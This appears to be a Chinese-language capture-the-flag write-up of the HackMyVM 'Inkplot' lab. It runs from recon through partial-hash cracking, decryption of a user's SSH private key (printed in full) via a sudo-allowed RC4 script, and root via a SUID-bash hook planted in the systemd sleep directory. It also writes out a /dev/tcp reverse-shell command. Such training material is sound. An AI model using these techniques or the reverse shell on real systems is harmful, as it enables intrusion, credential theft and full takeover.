---
title: HMV-Inkplot
description: 'Enjoy.'
pubDate: 2025-08-19
image: /mechine/Inkplot.jpg
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux
---

```plain
┌──(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27" | awk '{print $1}'
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
10.0.90.216
10.0.90.216
```

# 侦查
```plain
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sT -sV -p- -O 10.0.90.216
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-18 22:17 EDT
Nmap scan report for 10.0.90.216
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
3000/tcp open  ppp?
MAC Address: 08:00:27:F1:97:62 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8, Linux 5.0 - 5.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.53 seconds
```



```plain
┌──(root㉿kali)-[/home/kali]
└─# curl -v http://10.0.90.216:3000/
*   Trying 10.0.90.216:3000...
* Connected to 10.0.90.216 (10.0.90.216) port 3000
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.0.90.216:3000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 426 Upgrade Required
< Content-Length: 16
< Content-Type: text/plain
< Date: Tue, 19 Aug 2025 02:20:07 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
* Connection #0 to host 10.0.90.216 left intact
Upgrade Required  
```

# 漏洞点
HTTP/1.1 426 Upgrade Required

 HTTP 状态码 **426** 表示：客户端（你用的 curl）请求的资源只接受通过更高版本的协议访问，比如 WebSocket (`Upgrade: websocket`) 或 HTTP/2 (`Upgrade: h2c`)。  

利用websocat进行连接



```plain
┌──(root㉿kali)-[/home/kali]
└─# websocat ws://10.0.90.216:3000/                                                                         

Welcome to our InkPlot secret IRC server
Bob: Alice, ready to knock our naive Leila off her digital pedestal?
Alice: Bob, I've been dreaming about this for weeks. Leila has no idea what's about to hit her.
Bob: Exactly. We're gonna tear her defense system apart. She won't see it coming.
Alice: Poor Leila, always so confident. Let's do this.
Bob: Alice, I'll need that MD5 hash to finish the job. Got it?
Alice: Yeah, I've got it. Time to shake Leila's world.
Bob: Perfect. Release it.
Alice: Here it goes: d51540...
*Alice has disconnected*
Bob: What?! Damn it, Alice?! Not now!
Leila: clear

欢迎来到 InkPlot 秘密 IRC 服务器

Bob：Alice，准备好把我们天真的 Leila 从她的“数字高台”上拉下来了吗？
Alice：Bob，我已经梦想这件事好几周了。Leila 完全不知道她即将面临什么。
Bob：没错。我们要彻底拆掉她的防御系统。她根本不会预料到。
Alice：可怜的 Leila，总是那么自信。我们开始吧。
Bob：Alice，我需要那个 MD5 哈希来完成任务。拿到了吗？
Alice：嗯，我拿到了。是时候震撼 Leila 的世界了。
Bob：完美。放出它吧。
Alice：给你：d51540...
*Alice 已断开连接*
Bob：什么？！该死的 Alice？！偏偏现在！
Leila：clear
```

写个脚本

```plain
#!/bin/bash
flag="d51540"
 
while read -r word; do
    hash=$(echo "$word" | md5sum | cut -d " " -f 1)
    if [[ $hash == $flag* ]]; then
        echo "[+]I got it! PASS: $word, HASH: $hash"
    fi
done < $1
```

```plain
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ./flag.sh wordlists/rockyou.txt
[+]I got it! PASS: palmira, HASH: d515407c6ec25b2a61656a234ddf22bd
[+]I got it! PASS: intelinside, HASH: d51540c4ecaa62b0509f453fee4cd66b
```

获得密码palmira和intelinside

尝试登录

```plain
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ssh leila@10.0.90.216
Auto-standby now activated after 2 min of inactivity
leila@10.0.90.216's password: 
Permission denied, please try again.
leila@10.0.90.216's password: 
Linux inkplot 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-1 (2023-07-14) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

[oh-my-zsh] Would you like to update? [Y/n] n

╭─leila@inkplot ~ 
╰─$ whoami
leila
```

# 提权
## 信息收集
```plain
 sudo -l
 sudo: unable to resolve host inkplot: Name or service not known
Matching Defaults entries for leila on inkplot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User leila may run the following commands on inkplot:
    (pauline : pauline) NOPASSWD: /usr/bin/python3 /home/pauline/cipher.py
```

### sudo -l 允许的命令
```plain
User leila may run the following commands on inkplot:
    (pauline : pauline) NOPASSWD: /usr/bin/python3 /home/pauline/cipher.py
```

+ `(pauline : pauline)` → 以 **用户 pauline 和用户组 pauline** 的身份运行
+ `NOPASSWD` → **不需要密码**
+ `/usr/bin/python3 /home/pauline/cipher.py` → **只能执行这个 Python 脚本**

⚡ 总结：

+ `leila` 不能随便用 `sudo` 变成 root
+ 但可以用 `sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py` 来执行 `cipher.py`，且 **不需要输入密码**

```plain
╭─leila@inkplot ~ 
╰─$ cat /home/pauline/cipher.py                                                                                                                        1 ↵
import os
import json
import argparse
from Crypto.Cipher import ARC4
import base64

with open('/home/pauline/keys.json', 'r') as f:
    keys = json.load(f)

crypt_key = keys['crypt_key'].encode()

def encrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        file_content = f.read()

    cipher = ARC4.new(key)
    encrypted_content = cipher.encrypt(file_content)

    encoded_content = base64.b64encode(encrypted_content)

    base_filename = os.path.basename(filepath)

    with open(base_filename + '.enc', 'wb') as f:
        f.write(encoded_content)

    return base_filename + '.enc'

def decrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        encrypted_content = f.read()

    decoded_content = base64.b64decode(encrypted_content)

    cipher = ARC4.new(key)
    decrypted_content = cipher.decrypt(decoded_content)

    return decrypted_content

parser = argparse.ArgumentParser(description='Encrypt or decrypt a file.')
parser.add_argument('filepath', help='The path to the file to encrypt or decrypt.')
parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt the file.')
parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt the file.')

args = parser.parse_args()

if args.encrypt:
    encrypted_filepath = encrypt_file(args.filepath, crypt_key)
    print("The encrypted and encoded content has been written to: ")
    print(encrypted_filepath)
elif args.decrypt:
    decrypt_key = input("Please enter the decryption key: ").encode()
    decrypted_content = decrypt_file(args.filepath, decrypt_key)
    print("The decrypted content is: ")
    print(decrypted_content)
else:
    print("Please provide an operation type. Use -e to encrypt or -d to decrypt.")
```

### cipher.py   
#### 1️⃣ 导入模块
```plain
import os
import json
import argparse
from Crypto.Cipher import ARC4
import base64
```

+ `os` → 文件路径处理
+ `json` → 读取 `keys.json`
+ `argparse` → 命令行参数解析
+ `Crypto.Cipher.ARC4` → RC4 对称加密算法
+ `base64` → 对加密数据做 Base64 编码/解码

---

#### 2️⃣ 读取密钥
```plain
with open('/home/pauline/keys.json', 'r') as f:
    keys = json.load(f)

crypt_key = keys['crypt_key'].encode()
```

+ 打开 `/home/pauline/keys.json`，读取 JSON 格式密钥
+ `crypt_key` 是 **RC4 的加密密钥**，并转成 bytes 类型

---

#### 3️⃣ 加密函数
```plain
def encrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        file_content = f.read()

    cipher = ARC4.new(key)
    encrypted_content = cipher.encrypt(file_content)

    encoded_content = base64.b64encode(encrypted_content)

    base_filename = os.path.basename(filepath)

    with open(base_filename + '.enc', 'wb') as f:
        f.write(encoded_content)

    return base_filename + '.enc'
```

+ 打开要加密的文件，读取二进制内容
+ 用 **RC4 + **`**key**` 加密
+ 用 Base64 编码加密后的内容
+ 保存成 `<原文件名>.enc` 文件
+ 返回加密后的文件名

---

#### 4️⃣ 解密函数
```plain
def decrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        encrypted_content = f.read()

    decoded_content = base64.b64decode(encrypted_content)

    cipher = ARC4.new(key)
    decrypted_content = cipher.decrypt(decoded_content)

    return decrypted_content
```

+ 打开加密文件，读取 Base64 编码内容
+ 解码 Base64 → 得到 RC4 加密内容
+ 用提供的 `key` 做 RC4 解密
+ 返回解密后的原始内容（bytes 类型）

---

#### 5️⃣ 命令行参数解析
```plain
parser = argparse.ArgumentParser(description='Encrypt or decrypt a file.')
parser.add_argument('filepath', help='The path to the file to encrypt or decrypt.')
parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt the file.')
parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt the file.')

args = parser.parse_args()
```

+ 脚本接受三个参数：
    1. `filepath` → 文件路径
    2. `-e` / `--encrypt` → 加密操作
    3. `-d` / `--decrypt` → 解密操作

---

#### 6️⃣ 根据参数执行
```plain
if args.encrypt:
    encrypted_filepath = encrypt_file(args.filepath, crypt_key)
    print("The encrypted and encoded content has been written to: ")
    print(encrypted_filepath)
elif args.decrypt:
    decrypt_key = input("Please enter the decryption key: ").encode()
    decrypted_content = decrypt_file(args.filepath, decrypt_key)
    print("The decrypted content is: ")
    print(decrypted_content)
else:
    print("Please provide an operation type. Use -e to encrypt or -d to decrypt.")
```

+ 如果加密：
    - 调用 `encrypt_file()`，用 `crypt_key` 加密
    - 输出生成的 `.enc` 文件名
+ 如果解密：
    - 提示用户输入解密密钥
    - 调用 `decrypt_file()` 解密
    - 打印解密后的内容（注意是 bytes，需要解码成字符串看）
+ 否则：
    - 提示用户必须指定 `-e` 或 `-d`

---

⚡ **总结**

+ 这个脚本是 **RC4 + Base64 加密/解密工具**
+ 加密固定用 `keys.json` 中的 `crypt_key`
+ 解密可以手动输入密钥，也可以用同样的 key
+ 文件操作都是在当前目录下生成 `.enc` 文件或读取解密文件

##  RC4 - 对称流密码  
+ RC4 是 **对称加密算法**，意味着加密和解密使用 **同一个密钥**
+ RC4 是 **流密码（stream cipher）**，它的核心是把明文逐字节和一个伪随机密钥流做 **XOR 异或运算**

公式简化：

```plain
密文 = 明文 ⊕ 密钥流
明文 = 密文 ⊕ 密钥流
```

---

### 2️⃣ 异或运算的特点
+ XOR 运算有个规律：

```plain
A ⊕ B ⊕ B = A
```

+ 也就是说，如果你对同一段数据用同一个密钥流 XOR 两次，它会回到原来的值

## 解密id_rsa
```plain
╭─leila@inkplot /tmp 
╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py
usage: cipher.py [-h] [-e] [-d] filepath
cipher.py: error: the following arguments are required: filepath
╭─leila@inkplot /tmp 
╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e /home/pauline/.ssh/id_rsa                                    
The encrypted and encoded content has been written to: 
id_rsa.enc
╭─leila@inkplot /tmp 
╰─$ cat id_rsa.enc | base64 -d > new_id_rsa.enc
╭─leila@inkplot /tmp 
╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e new_id_rsa.enc           
The encrypted and encoded content has been written to: 
new_id_rsa.enc.enc
╭─leila@inkplot /tmp 
╰─$ cat new_id_rsa.enc.enc                     
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFyc3RKYXVLWThpRG9aMXN6aFdCT01PY2VyMW5zMTRPZ2FiVjR5R3VXYkxTWGova3pqQ1JFClVjTXU2MXNVWUxkM05GSzRKQWRTY1RzWkZhVmIybGw3Z3J3clNXWEVWUUwzdDRLNlRuWnpKczZiN2JrTXBKMkRqUHZBYTcKS2ltUm9SZzAybWFIS1BNWkNreEUwY0U2T29sZG1oblFZcjFPdTIyTXpFQlR6cGphbXdjUGIrd3dnTFBGdm1EeHd4NnpVdApKcWxCQW93SHVrK25zSHdDVnV3eTR1Y1VIdnh3c1F5NkQrbjVoQlc2Z1NTRXBOVWFreHJ0ZTI0a0RZN2M1TlRrY3NGakdHCk9ZbWhLL1VnVXRtUVZuMCsxUURjUkNEMk53NTZKN1lkNGQxS1ArMUJQVldSNzJhbXpGUjRWT24xVHIyWHc2d1FMRklUYW4KaFVqc2hzYXoxbnUwV1BVOXJvaXBTTnhXUVltQTdtWkUwQU9vWlBZbTFSVVMrQWRzaXNRNmQ5QkJRUmxGb29DekJXYXJCQQptNWpTdjJEWDhxMHRaTjVFeStTYkNDaUVUVnQ2ZXQ0TFdndEZwOVVQQWdhM2RUU1IwdkwyYlZxOVhOaGpOemhZK25DclBTCkhzV3doSFRnZCtiMm54WmRyTkJ1VG1zdU9tNCtKSkJLN2Fsb0QrMTVBQUFGaU4waWpDemRJb3dzQUFBQUIzTnphQzF5YzIKRUFBQUdCQUs3TFNXcmltUElnNkdkYk00VmdUakRuSHE5WjdOZURvR20xZU1ocmxteTBsNC81TTR3a1JGSERMdXRiRkdDMwpkelJTdUNRSFVuRTdHUldsVzlwWmU0SzhLMGxseEZVQzk3ZUN1azUyY3liT20rMjVES1NkZzR6N3dHdXlvcGthRVlOTnBtCmh5anpHUXBNUk5IQk9qcUpYWm9aMEdLOVRydHRqTXhBVTg2WTJwc0hEMi9zTUlDenhiNWc4Y01lczFMU2FwUVFLTUI3cFAKcDdCOEFsYnNNdUxuRkI3OGNMRU11Zy9wK1lRVnVvRWtoS1RWR3BNYTdYdHVKQTJPM09UVTVITEJZeGhqbUpvU3YxSUZMWgprRlo5UHRVQTNFUWc5amNPZWllMkhlSGRTai90UVQxVmtlOW1wc3hVZUZUcDlVNjlsOE9zRUN4U0UycDRWSTdJYkdzOVo3CnRGajFQYTZJcVVqY1ZrR0pnTzVtUk5BRHFHVDJKdFVWRXZnSGJJckVPbmZRUVVFWlJhS0Fzd1ZtcXdRSnVZMHI5ZzEvS3QKTFdUZVJNdmttd2dvaEUxYmVucmVDMW9MUmFmVkR3SUd0M1Uwa2RMeTltMWF2VnpZWXpjNFdQcHdxejBoN0ZzSVIwNEhmbQo5cDhXWGF6UWJrNXJManB1UGlTUVN1MnBhQS90ZVFBQUFBTUJBQUVBQUFHQVN4MXlOZndkMVFPZVMvaE42alhLTkVyR0RYCjM4QVZ0LzNwMk5RN2UwWTQreUNEMkQwT2d1OGVJS2Nqcm9SVzNpVExwMWhvb2MvQ3IwNnkvdUNxWGtwWGgrczZLSG5pN1IKekd0aDYrRU1PRE9XbjdDanhjUW82YmV3WjdmVEZ5ODBNblIybkRFSzV6WnRFQ3pBOFpHbG00djBYem50TVNtQW9LZFNYNQp2ZkZERkZjUzQ3cWcxMVlxRnRlclhYbitmd3VNb0lkWE0reU9wOU9pTDRrR2tkcnhPMXVtRXFmbk5sSy95VTdSVzNXZE1iCks0aW16R3ZJZllBRi8wdVRFc1dIbFdqL1hoOVpJSXdzMTk2S2VqNDVOd0M2TGo2UmhBRDNSbkpCNmVJRWVrenFIWEQ1anYKMjAwWE9KOTZ0dmUvbHdLbEUyZWdWR2xEZlhGRHkvUVU1WXpCR204VWd3NWFvWS93V0R1RG1OYjRtVDR4NUdHQ1ZocVRLWQpnOUppQlpGUHJkSFhGclp4bUpScEpLa1Azd2xMaVNYc0JQR2FMWjNxRFlVay9PeVRzNUhNREpoNTAzMFJ6Qlp5WG9kTXJ0Cjc5UXNqUEtxc1ZSL2d6YWd6Q2w3bWFTdFUzMDdrTGVFQnlDZDRmMlI0OWIwVXA3RFF2azdsdS8wMGJIdmFBVUcrL0FBQUEKd1FDcXFobDRqZ0MrMGJ2K2dIY0Z0VHZTcjFJVGdHYzVwc0ZId1diTnR3UUFHanhieUs0R3FlVTM1ckY2b2hOSXQ3dXNBQgpBQ2tiMmhSWTJVK1BQRTNNMkdzTXBQYnJXeWYwSlRnd0M4M0h3NWhFN2liUDRRWUsyeUFuNDA5elVudzZLQU4wdHVTVGJ5ClF0cmFWdXEwVEplWVUzbm9WSlVmRm1zMHgxUUFIQmN4TTlaOWsrMSt1alhsY1ppazlDM3FoRUFVZFR4aWtMeGpUT2FFaFcKVzZ5NDFrVjc4RzU0NmNnVWNqUk9CdTIxellzWTBHOHRQam9idFN6dVcrSGtva3ltb0FBQURCQVBKVUsrQ291VnlkRW1vMgpuOVJOWWI5eFg0SjBQUWdreTYwRVF4NXhxZUFMV2hIcUpYZXRtemd5QW0ycmx1R0ErNHUwZWN5eVZBN1hLMVN5TmRFTkhrClRiM05OQ3padmpmSEhyZkRtM3c3OTlQVlAzZEFocEkzSmIxa0ZkM0h5TURhRklGM3AxS3gvR2I4VXlPcWxpTGg5d09XTWEKcnV2UzRGdk9sZlc3WTl1WWtpTThaSHR4VWNZRWVqN3FUYkpmNFBNdERxRDhQODZqTE8xeVV5NTdKVTEwbnIyVTNoYllGRgpHeGdwMmNVR2cra0tsWHE5SktybGJ6YURuWkpFdzZvd0FBQU1FQXVLZS9MbmhXVGJJZ3cyOW1HUm9iZmxTaVBaUTltUTcrCmlFV1FXdzdGT1dwOGlHN09RM2J1Rk1DdnBzYWZqZTgrUEw0YlYwdUttSTZhbEsySW5xR2xON2p0K0ZZTENEdWdzbVV3aUEKQTZLcmxzRlh0UHYvQk9vNkxLNVllNk9UWUlRbklSRjVna3BVSjFGdVBTUTRkUHh3bEk3NDBPSEFpQjdCSE5nSlFoZCtFbApzWXdNQnJodXBORE5PakdJc2IydDV5Ly9PRUd3NGdpZjRGYmhEOUdxT2NnRG1Zb1hTUHhxTFVCOGRpdXBQVUdVSFVCT1NwCmFEZkFEOHloaVVtYlV6QUFBQURuQmhkV3hwYm1WQVpHVmlhV0Z1QVFJREJBPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==%                       
╭─leila@inkplot /tmp 
╰─$ cat new_id_rsa.enc.enc | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```plain
┌──(root㉿kali)-[/home/kali/Desktop]
└─# chmod 777 id_rsa 

┌──(root㉿kali)-[/home/kali/Desktop]
└─# ssh pauline@10.0.90.216 -i id_rsa                                                         
Auto-standby now activated after 2 min of inactivity
Linux inkplot 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-1 (2023-07-14) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
[oh-my-zsh] Would you like to update? [Y/n] n
[oh-my-zsh] You can update manually by running `omz update`

╭─pauline@inkplot ~ 
╰─$ 
```

```plain
╭─pauline@inkplot ~ 
╰─$ id
uid=1000(pauline) gid=1000(pauline) groups=1000(pauline),100(users),1002(admin)
╭─pauline@inkplot ~ 
╰─$ 
Broadcast message from root@inkplot (Tue 2025-08-19 05:45:10 CEST):

The system will suspend now!

```

在思考的时候发现机器被挂起了

重启一下

```plain
2️⃣ 所属组

groups=1000(pauline),100(users),1002(admin)

你属于三个组：

pauline（主组）

users（普通用户组）

admin（管理员组，可能有 sudo 权限）
```

```plain
╭─pauline@inkplot ~ 
╰─$ find / -group admin 2>/dev/null
/usr/lib/systemd/system-sleep
```

```plain
/usr/lib/systemd/system-sleep 是一个在 Linux 系统中由 systemd 管理的特殊目录，用于存放在系统进入睡眠状态（如挂起到内存或磁盘）或唤醒时自动执行的脚本。

当系统准备进入睡眠状态时，systemd 会运行此目录下所有以 .needs 或 .wants 结尾的脚本，并传递一个参数，指示系统即将进入哪种睡眠状态（例如 suspend、hibernate 或 hybrid-sleep）。同样，当系统从睡眠状态唤醒时，也会运行相应的脚本。

这些脚本通常用于执行一些在系统睡眠或唤醒时需要进行的特殊操作，例如：

保存或恢复某些硬件状态。
停止或重启某些服务。
更新或清理缓存。
执行一些自定义的操作。
```



## 提权root
```plain
╭─pauline@inkplot ~ 
╰─$ cd /usr/lib/systemd/system-sleep                                                                                                            1 ↵
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ echo '#!/bin/bash' > payload
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ echo 'chmod +s /bin/bash' >> payload
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ cat payload                      
#!/bin/bash
chmod +s /bin/bash
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ chmod +x payload
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ ls -la         
total 20
drwxrwx---  2 root    admin    4096 Apr 22 08:52 .
drwxr-xr-x 14 root    root    12288 Jul 28  2023 ..
-rwxr-xr-x  1 pauline pauline    31 Apr 22 08:52 payload

普通用户在执行 /bin/bash 时会获得 root 权限。
```

```plain
─pauline@inkplot ~
╰─$ echo '#!/bin/bash' > /tmp/root.sh && echo 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1' >> /tmp/root.sh && chmod +x /tmp/root.sh
```

静等挂起

```plain
bash -p
```

-p 表示 privileged mode（特权模式）

作用：

当 Bash 是 SUID 或 SGID 的程序时，-p 保留原来的有效 UID/GID，而不是降低为实际用户 UID/GID

这样可以让普通用户在拥有 SUID 的 Bash 下执行命令时 以 root 权限运行（如果 /bin/bash 的 SUID 被设置）

```plain

╭─pauline@inkplot ~ 
╰─$ bash -p
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls -la
total 52
drwx------  6 root root 4096 Aug  3  2023 .
drwxr-xr-x 18 root root 4096 Jul 27  2023 ..
lrwxrwxrwx  1 root root    9 Jun 15  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Jul 22  2023 .bashrc
-rw-------  1 root root   20 Aug  1  2023 .lesshst
drwxr-xr-x  3 root root 4096 Aug  1  2023 .local
drwxr-xr-x  4 root root 4096 Jul 26  2023 .npm
drwxr-xr-x 12 root root 4096 Jul 22  2023 .oh-my-zsh
-rw-r--r--  1 root root  161 Jul 22  2023 .profile
-rwx------  1 root root   33 Aug  1  2023 root.txt
-rw-r--r--  1 root root   66 Jul 22  2023 .selected_editor
drwx------  2 root root 4096 Jul 25  2023 .ssh
-rw-r--r--  1 root root  165 Jul 26  2023 .wget-hsts
lrwxrwxrwx  1 root root    9 Jul 22  2023 .zsh_history -> /dev/null
-rw-r--r--  1 root root 3890 Jul 22  2023 .zshrc
bash-5.2# cat root.txt 
4d9089c262be4a03e3ebfdaff0a8f7c6
```

```plain
bash-5.2# cat suspend.sh 
#!/bin/bash
 
while true ; do
  TIME=$(w -o |grep "pauline" | awk '{print $5}')
  if [[ $TIME != "-zsh" ]] ; then
    TIME=${TIME%%:*}
    if [[ $TIME -gt 1 ]] ; then
      systemctl suspend
    fi
  fi
  sleep 5
done

不断检查用户 pauline 的空闲时间（idle time）。
如果用户空闲时间超过 1 小时，就执行 systemctl suspend，让系统进入挂起（睡眠）状态。
脚本每 5 秒检查一次。
```



